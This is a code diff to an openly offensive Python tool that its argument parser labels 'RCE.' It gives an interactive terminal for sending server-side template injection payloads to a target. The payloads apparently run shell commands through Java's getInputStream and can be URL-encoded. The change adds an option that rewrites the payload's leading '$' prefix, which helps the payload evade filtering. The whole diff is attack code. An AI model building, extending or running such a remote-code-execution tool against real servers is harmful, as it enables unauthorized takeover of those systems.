@@ -6,12 +6,13 @@ from time import gmtime, strftime
 parser = argparse.ArgumentParser(description="RCE.")
 parser.add_argument("-t", "--target",metavar="",required=True,help="Target to give an STI")
 parser.add_argument("-u","--url-encode", action="store_true", help="URL Encode")
+parser.add_argument("-p","--prefix", type=ascii, help="Modify Payload Prefix")
 parser.add_argument("-d","--debug", action="store_true",default=False, help="Print debug")
 args = parser.parse_args()
 
-
-url_encode=args.url_encode
 target=args.target
+url_encode=args.url_encode
+modify_prefix=args.prefix
 DEBUG=args.debug
 
 def yellow(string):
@@ -44,6 +45,8 @@ class Terminal(Cmd):
 			payload+=line
 
 		payload+=').getInputStream())}'
+		if modify_prefix:
+			payload = payload.replace("$", modify_prefix[1:-1], 1)		
 		if url_encode:
 			payload_encoded=urllib.parse.quote_plus(payload,safe='')
 			debug('Payload: ',payload_encoded)
